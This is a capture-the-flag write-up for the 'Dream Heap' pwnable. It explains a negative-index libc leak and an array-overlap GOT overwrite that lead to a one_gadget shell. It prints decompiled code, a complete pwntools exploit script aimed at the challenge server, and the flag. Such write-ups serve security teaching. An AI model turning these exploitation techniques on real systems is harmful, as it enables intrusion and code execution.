# Dream Heap

Dream Heap is a pwnable with the classic options: write, read, edit, delete:

```
Online dream catcher! Write dreams down and come back to them later!

What would you like to do?
1: Write dream
2: Read dream
3: Edit dream
4: Delete dream
5: Quit
```
There actually is a "heap" way to solve this challenge, we found another bug though that did not require any heap exploitation:

The following security measure are in place:
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
So we don't have PIE and only Partial RELRO. This screams for us to overwrite some GOT entry with system or with a magic gadget.

The binary has two arrays stored in the .bss section. HEAP_PTRS[8] and SIZES[8]. HEAP_PTRS contains pointers to the dreams you allocated and SIZES contains the size of the dreams you allocated. Above them is a variable called INDEX, that holds the amount of dreams you allocated.

We can leak an address using the `Read dream` function:

```
unsigned __int64 read_dream()
{
  int index; // [rsp+Ch] [rbp-14h]
  __int64 dream; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Which dream would you like to read?");
  index = 0;
  __isoc99_scanf("%d", &index);
  if ( index <= INDEX )                         // leak negative number
  {
    dream = HEAP_PTRS[index];
    printf("%s", dream);
  }
  else
  {
    puts("Hmm you skipped a few nights...");
  }
  return __readfsqword(0x28u) ^ v3;
}
```
The index <= INDEX is a signed comparison, thus we can provide a negative index. If we provide a pointer to a GOT entry, ` printf("%s", dream)` will leak the corresponding libc address. Starting at `0x000000000400520` we have the ELF JMPREL Relocation Table that holds pointers to the GOT.
Thus by providing the correct negative offset we can leak a libc address and defeat ASLR.

Next we have to overwrite a GOT entry with a one_gadget/magic gadget (see: https://github.com/david942j/one_gadget)

For this we abuse the `Make dream` and `Edit dream` functions. Notice that in READ dream, there is no check for the amount of dreams to allocate. 

```
unsigned __int64 new_dream()
{
  int len; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 canary; // [rsp+18h] [rbp-8h]

  canary = __readfsqword(0x28u);
  len = 0;
  puts("How long is your dream?");
  __isoc99_scanf("%d", &len);
  buf = malloc(len);
  puts("What are the contents of this dream?");
  read(0, buf, len);
  HEAP_PTRS[INDEX] = (__int64)buf;              // index can overflow into SIZES
  SIZES[INDEX++] = len;
  return __readfsqword(0x28u) ^ canary;
}
```
Remember that SIZES is 8 pointers after HEAP_PTRS. Thus we can overflow HEAP_PTRS into SIZES. Normally this would not be a problem, but HEAP_PTRS is of size 8 (pointers), while SIZES is of size 4 (int32). So at the 20th write, the lower 4 bytes of HEAP_PTRS[18] and SIZES[20] will overlap. So we can change HEAP_PTRS[18] to point to `puts@got` instead of a heap chunk.

Now we will use the `Edit dream` function to change the content of a dream/"heap chunk":

```
unsigned __int64 edit_dream()
{
  int index; // [rsp+8h] [rbp-18h]
  int size; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("Which dream would you like to change?");
  index = 0;
  __isoc99_scanf("%d", &index);
  if ( index <= INDEX )
  {
    buf = (void *)HEAP_PTRS[index];
    size = SIZES[index];
    read(0, buf, size);
    *((_BYTE *)buf + size) = 0;
  }
  else
  {
    puts("You haven't had this dream yet...");
  }
  return __readfsqword(0x28u) ^ v4;
}
```
As you probably see, if we edit HEAP_PTRS[18], we don't actually edit a heap chunk but the content of `puts@got`. So we simply overwrite `puts@got` to point to `one_gadget`. The next `puts` call will now give us shell.


Here is the full exploit:

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('dream_heaps')
libc = context.binary = ELF('libc6_2.23-0ubuntu11_amd64.so')
#libc = context.binary = ELF('/lib/x86_64-linux-gnu/libc.so.6')


host = args.HOST or 'chal1.swampctf.com'
port = int(args.PORT or 1070)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b*0x400906
continue
'''.format(**locals())


def read(index):
    io.sendlineafter("> ", "2")
    io.sendlineafter("?\n", str(index))
    leak =  io.recvline()
    leak = leak.split("What")[0]
    leak = leak[:6]
    return u64(leak.ljust(8, '\x00'))

def write(length, content):
    io.sendlineafter("> ", "1")
    io.sendlineafter("?\n", str(length))
    io.sendlineafter("?\n", content)


def delete(index):
    io.sendlineafter("> ", "4")
    io.sendlineafter("?\n", str(index))

def edit(index, content):
    io.sendlineafter("> ", "3")
    io.sendlineafter("?\n", str(index))
    io.sendline(content)


# -- Exploit goes here --

io = start()

# Compute offset from JMPREL to HEAP_PTRS
jmprel = 0x00000004005B0 
offset = (0x0006020A0 - jmprel)/8
log.info(offset)

leak = read(-offset)
log.info("__libc_start_main@libc: 0x{:x}".format(leak))
libc.address = leak - libc.sym.__libc_start_main 
log.info("Libc: 0x{:x}".format(libc.address))

# overlap HEAP_PTRS and SIZES
for i in range(19):
    write(0x8, "A")

write(0x0, "")
write(int(exe.got.puts), "")

one_gadget = 0x45216
#local
#one_gadget = 0x4f322

# Overwrite puts@got with one_gadget
edit(18, p64(libc.address + one_gadget))

io.interactive()
```

flag{d0nt_bE_nu11_b3_dul1}
